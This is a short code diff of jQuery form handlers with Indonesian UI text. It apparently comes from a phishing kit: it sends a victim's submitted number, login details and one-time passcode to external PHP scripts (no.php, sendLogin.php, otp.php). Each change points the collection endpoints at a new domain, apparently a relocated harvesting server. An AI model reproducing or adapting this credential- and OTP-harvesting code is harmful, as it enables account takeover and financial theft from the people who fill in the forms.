@@ -4,7 +4,7 @@
  $(".load").show();
  $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app15/no.php',
+ url: 'https://axcellent.cf-pow.cfd/app15/no.php',
  data: $(this).serialize(),
  datatype: 'JSON', 
  complete: function(data) {
@@ -28,7 +28,7 @@ $(document).ready(function(){
  document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app15/sendLogin.php',
+ url: 'https://axcellent.cf-pow.cfd/app15/sendLogin.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -64,7 +64,7 @@ $(document).ready(function(){
  document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app15/otp.php',
+ url: 'https://axcellent.cf-pow.cfd/app15/otp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
